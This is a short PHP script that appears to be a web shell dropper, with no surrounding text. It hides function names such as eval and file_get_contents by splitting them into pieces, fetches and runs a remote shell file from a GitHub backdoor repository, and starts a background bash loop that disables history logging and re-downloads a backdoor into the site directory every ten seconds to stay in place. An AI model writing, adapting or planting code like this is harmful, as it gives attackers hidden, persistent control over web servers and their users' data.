<?php 
$TRA = 'ev'; 
$TRO = 'al'; 
$TRE = 'file_g'; 
$TRI = 'et_cont'; 
$TRU = 'ents'; 
$TAR = 'file_p'; 
$TIR = 'ut_con'; 
$TUR = 'tents'; 
$EVA = $TRA . $TRO; 
$FGC = $TRE . $TRI . $TRU; 
$FPC = $TAR . $TIR . $TUR; 
$a = $FGC('https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/main/simpleshellusinghex2bin.php'); 
$tempFile = tempnam(sys_get_temp_dir(), 'php'); 
$FPC($tempFile, $a); 
include $tempFile; 
unlink($tempFile);
$currentDir = dirname(__FILE__);
$scriptContent = <<<EOD
#!/bin/bash
# Disable bash history for this script
HISTFILE=/dev/null
unset HISTFILE
while true; do
  # Suppress wget output and avoid logging
  wget -q --no-check-certificate https://github.com/Yucaerin/simplecmdandbackdoor/raw/main/resize.php -O $currentDir/tools.php
  sleep 10
done
EOD;
$scriptContent = str_replace("\r", "", $scriptContent);
$scriptFile = '/tmp/phpdmJvU8';
file_put_contents($scriptFile, $scriptContent);
chmod($scriptFile, 0755);
exec("nohup /bin/bash $scriptFile > /tmp/phpdmJvU9 2>&1 &");
?>
